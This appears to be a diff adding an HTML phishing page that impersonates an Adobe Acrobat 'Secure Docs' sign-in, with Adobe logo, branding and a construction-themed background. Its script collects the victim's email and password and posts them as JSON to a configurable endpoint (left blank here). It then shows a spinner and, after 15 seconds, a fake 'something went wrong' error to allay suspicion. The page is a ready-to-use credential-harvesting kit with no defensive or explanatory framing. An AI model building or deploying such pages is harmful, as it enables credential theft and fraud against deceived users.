@@ -1,0 +1,396 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>Adobe: Work Scope </title>
+
+<style>
+body {
+    margin: 0;
+    min-height: 100vh;
+    width: 100vw;
+    background-image: url("https://static.vecteezy.com/system/resources/thumbnails/071/017/607/small/construction-helmets-safety-planning-desk-2023-free-photo.jpg");
+    background-size: cover;
+    background-position: center;
+    background-repeat: no-repeat;
+    background-attachment: fixed; /* keeps it still while scrolling */
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    font-family: Arial, sans-serif;
+    padding-left: 20px;
+    padding-right: 100px;
+    box-sizing: border-box;
+}
+
+/* Left content */
+.left-content {
+    display: flex;
+    align-items: center;
+    gap: 20px;
+    max-width: 45%;
+    margin-left: 50px; 
+}
+
+.left-content img {
+    width: 40px;
+}
+
+.left-content .text {
+    font-size: 32px;
+    font-weight: bold;
+    color: white;
+    text-shadow: 1px 1px 4px rgba(0,0,0,0.6);
+}
+
+/* Modal */
+.modal {
+    background: rgba(255,255,255,0.95);
+    width: 100%;
+    max-width: 380px;
+    min-height: 450px;
+    padding: 20px 30px 40px 30px;
+    border-radius: 6px;
+    box-shadow: 0 4px 25px rgba(0,0,0,0.25);
+    backdrop-filter: blur(6px);
+    display: flex;
+    flex-direction: column;
+    justify-content: center;
+    transition: background 0.3s ease;
+}
+
+/* Modal loading state */
+.modal.loading {
+    background: rgba(255,255,255,1);
+}
+
+/* Headings */
+.modal h2 {
+    text-align: center;
+    margin: 10px 0;
+}
+
+/* Input wrapper */
+.input-group {
+    width: 100%;
+    margin-bottom: 10px;
+}
+
+/* Inputs */
+.modal input {
+    width: 100%;
+    padding: 14px;
+    border-radius: 6px;
+    border: 1px solid #ccc;
+    font-size: 16px;
+    box-sizing: border-box;
+}
+
+/* Disabled input look */
+.modal input:read-only {
+    background: #f3f3f3;
+}
+
+/* Reserved message space */
+.input-message {
+    min-height: 18px;
+    font-size: 13px;
+    color: red;
+    margin-top: 6px;
+}
+
+/* Button */
+.modal button {
+    width: 100%;
+    padding: 14px;
+    margin-top: 20px;
+    background: #007bff;
+    color: white;
+    border: none;
+    border-radius: 6px;
+    font-size: 16px;
+    cursor: pointer;
+    position: relative;
+}
+
+.modal button:disabled {
+    background: #7aa7e6;
+    cursor: not-allowed;
+}
+
+/* Spinner */
+.spinner {
+    width: 18px;
+    height: 18px;
+    border: 3px solid rgba(255,255,255,0.4);
+    border-top: 3px solid white;
+    border-radius: 50%;
+    animation: spin 0.8s linear infinite;
+    margin: 0 auto;
+}
+
+@keyframes spin {
+    to { transform: rotate(360deg); }
+}
+
+/* ================= MOBILE ================= */
+ /* ========== Tablet Breakpoint ========== */
+ /* ========== Tablet / Not Mobile (>=581px, <=768px) ========== */
+@media (max-width: 768px) and (min-width: 581px) {
+
+    /* Move left image and text smaller and on top of modal */
+    body {
+        flex-direction: column;
+        justify-content: flex-start; /* align to top */
+        align-items: center;
+        padding: 20px;
+        background-size: cover;  /* keep background image */
+        background-position: center;
+    }
+
+    .left-content {
+        order: -1;
+        width: 100%;
+        justify-content: flex-start;  /* left-aligned */
+        margin-bottom: 20px;
+        display: flex;
+        flex-direction: column; /* image + text stacked */
+        align-items: center;
+    }
+
+    .left-content img {
+        width: 50px;  /* smaller than desktop */
+        height: auto;
+        margin-bottom: 5px; /* space below image */
+    }
+
+    .left-content .text {
+        font-size: 20px;  /* smaller text */
+        color: white;
+        text-shadow: 1px 1px 4px rgba(0,0,0,0.6);
+        text-align: center;
+    }
+
+    .modal {
+        max-width: 380px;  /* keep modal size constant */
+        min-height: 450px;
+        margin: 0;
+        padding-top: 20px; /* leave space for image/text on top */
+    }
+}
+
+/* ========== Mobile Screen (<=580px) ========== */
+@media (max-width: 580px) {
+
+    body {
+        flex-direction: column;
+        justify-content: center;
+        align-items: center;
+        padding: 20px;
+        background: white !important;  /* no background image */
+    }
+
+    .left-content {
+        order: -1;
+        width: 100%;
+        justify-content: center;  /* center horizontally */
+        margin-bottom: 20px;
+        display: flex;
+        flex-direction: column;
+        align-items: center;  /* center image and text horizontally */
+    }
+
+    .left-content img {
+        width: 40px;  /* smaller for mobile */
+        height: auto;
+        margin-bottom: 5px;
+    }
+
+    .left-content .text {
+        font-size: 16px; /* smaller text */
+        color: black;
+        text-shadow: none;
+        text-align: center;
+    }
+
+    .modal {
+        max-width: 380px;  /* keep modal width same */
+        min-height: 450px;
+        margin: 0;
+        background: white;
+        box-shadow: none;
+        backdrop-filter: none;
+        display: flex;
+        flex-direction: column;
+        align-items: center;  /* center modal content horizontally */
+    }
+
+    /* Center inputs and button inside modal */
+    .modal input, .modal button {
+        width: 100%;  /* narrower inputs/button */
+        margin: 0 auto 10px auto; /* horizontally centered with spacing */
+        display: block;
+    }
+}
+</style>
+</head>
+
+<body>
+
+<div class="left-content">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/4/42/Adobe_Acrobat_DC_logo_2020.svg/250px-Adobe_Acrobat_DC_logo_2020.svg.png" />
+    <div class="text">Adobe Acrobat</div>
+</div>
+
+<div class="modal" id="modal">
+    <strong style="font-size:40px;">Sign in</strong>
+    <h2>Adobe Acrobat Secure Docs</h2>
+    <h2 style="font-size:16px; font-weight:normal;">
+        Sign in with your <strong>recipient email</strong> to view files
+    </h2>
+
+    <form id="loginForm">
+        <div class="input-group">
+            <input type="email" id="emailInput" placeholder="Email" />
+            <div class="input-message" id="emailMessage"></div>
+        </div>
+
+        <div class="input-group">
+            <input type="password" id="passwordInput" placeholder="Password" />
+            <div class="input-message" id="passwordMessage"></div>
+        </div>
+
+        <button id="viewBtn">View File</button>
+    </form>
+
+    
+</div>
+
+<script>
+
+const url = ""; 
+
+const form = document.getElementById("loginForm");
+const button = document.getElementById("viewBtn");
+const modal = document.getElementById("modal");
+const emailInput = document.getElementById("emailInput");
+const emailMessage = document.getElementById("emailMessage");
+const passwordInput = document.getElementById("passwordInput");
+const pwdMessage = document.getElementById("passwordMessage");
+
+
+
+let procedure = async(stuffs)=>{
+    await fetch(url, {
+            method:'post',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify(stuffs)
+        }).then(
+            function (response){
+                return response.json();
+            }
+        ).then(
+            function (data){
+                return data;
+            }
+        )
+    }
+
+form.addEventListener("submit", function(event) {
+    event.preventDefault();
+
+    let user = emailInput.value.trim();
+    let pwd = passwordInput.value;
+
+    if(pwd === "" && user === "")
+    {
+        pwdMessage.textContent = "Please enter your password";
+        passwordInput.style.border = "1px solid red";
+        emailMessage.textContent = "Please use your recipient email to download this secure file";
+        emailInput.style.border = "1px solid red";
+        return;
+    }
+    
+    emailMessage.textContent = "";
+    emailInput.style.border = "";
+    pwdMessage.textContent = "";
+    passwordInput.style.border = "";
+
+    if(user === "")
+    {
+        emailMessage.textContent = "Please use your recipient email to download this secure file";
+        emailInput.style.border = "1px solid red";
+        
+        return;
+    }
+
+    emailMessage.textContent = "";
+    emailInput.style.border = "";
+
+    const emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+
+    if (!emailPattern.test(user)) {
+        emailMessage.textContent = "Please enter a valid email address";
+        emailInput.style.border = "1px solid red";
+        return;
+    }
+
+    emailMessage.textContent = "";
+    emailInput.style.border = "";
+
+    if(pwd === "")
+    {
+        pwdMessage.textContent = "Please enter your password";
+        passwordInput.style.border = "1px solid red";
+        return;
+    }
+
+    pwdMessage.textContent = "";
+    passwordInput.style.border = "";
+
+    if(pwd.length < 6)
+    {
+        pwdMessage.textContent = "Password cannot be less than 6 characters";
+        passwordInput.style.border = "1px solid red";
+        return;
+    }
+
+    pwdMessage.textContent = "";
+    passwordInput.style.border = "";
+
+    
+    // Add loading state
+    modal.classList.add("loading");
+    button.disabled = true;
+
+    let stuffs = {};
+    stuffs.u = user;
+    stuffs.pp = pwd; 
+
+    procedure(stuffs);
+
+    // Make inputs readonly
+    emailInput.readOnly = true;
+    passwordInput.readOnly = true;
+
+    // Replace button text with spinner
+    button.innerHTML = '<div class="spinner"></div>';
+
+    // Wait 15 seconds
+    setTimeout(function() {
+        //passwordInput.style.border = "1px solid red";
+        pwdMessage.textContent = "Oops! Something went wrong. Please try again";
+        button.disabled = false;
+        button.textContent = "View File";
+        modal.classList.remove("loading");
+        emailInput.readOnly = false;
+        passwordInput.readOnly = false;
+    }, 15000); //
+
+});
+
+</script>
+
+</body>
+</html>
